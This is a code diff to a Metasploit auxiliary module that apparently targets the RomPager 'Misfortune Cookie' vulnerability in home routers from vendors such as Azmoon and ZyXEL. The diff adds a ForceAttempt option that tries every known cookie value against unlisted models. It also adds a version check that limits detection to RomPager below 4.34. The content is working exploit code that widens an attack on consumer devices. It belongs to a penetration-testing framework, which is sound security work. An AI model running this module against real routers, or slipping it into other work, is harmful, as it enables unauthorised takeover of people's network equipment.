@@ -38,6 +38,12 @@ class MetasploitModule < Msf::Auxiliary
             OptString.new('TARGETURI', [true, 'URI to test', '/']),
         ], Exploit::Remote::HttpClient
     )
+
+    register_advanced_options(
+        [
+            Msf::OptBool.new("ForceAttempt", [ false, "Force exploit attempt for all known cookies", false ]),
+        ], Exploit::Remote::HttpClient
+    )
   end
 
   def headers
@@ -48,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
 
   # List of known values and models
   def devices_list
-    {
+    known_devices = {
         :'AZ-D140W'=>
             {:name=>'Azmoon', :model=>'AZ-D140W', :values=>[
                 [107367693, 13]
@@ -184,15 +190,31 @@ class MetasploitModule < Msf::Auxiliary
             {:name=>'ZyXEL', :model=>'P-660R-T3', :values=>[
                 [107369567, 21]
             ]},
+        :'ALL'=> # Used when `ForceAttempt` === true
+            {:name=>'Unknown', :model=>'Forced', :values=>[]
+            },
     }
+    # collect all known cookies for a brute force option
+    all_cookies = []
+    known_devices.collect { |_, v| v[:values] }.each do |list|
+      all_cookies += list
+    end
+    known_devices[:'ALL'][:values] = all_cookies.uniq
+    known_devices
   end
 
 
   def check_response_fingerprint(res, fallback_status)
     fp = http_fingerprint(response: res)
     vprint_status("Fingerprint: #{fp}")
-    if /realm="(?<model>.+)"/ =~ fp
-      return model
+    # ensure the fingerprint at least appears vulnerable
+    if /RomPager\/(?<version>[\d\.]+)/ =~ fp
+      vprint_status("#{peer} is RomPager #{version}")
+      if Gem::Version.new(version) < Gem::Version.new('4.34')
+        if /realm="(?<model>.+)"/ =~ fp
+          return model
+        end
+      end
     end
     fallback_status
   end
@@ -205,6 +227,7 @@ class MetasploitModule < Msf::Auxiliary
     model = check_response_fingerprint(res, Exploit::CheckCode::Detected)
     if model != Exploit::CheckCode::Detected
       devices = devices_list[model.to_sym]
+      devices = devices_list['ALL'.to_sym] if devices.nil? && datastore['ForceAttempt']
       if devices != nil
         print_good("Detected device:#{devices[:name]} #{devices[:model]}")
         devices[:values].each { |value|
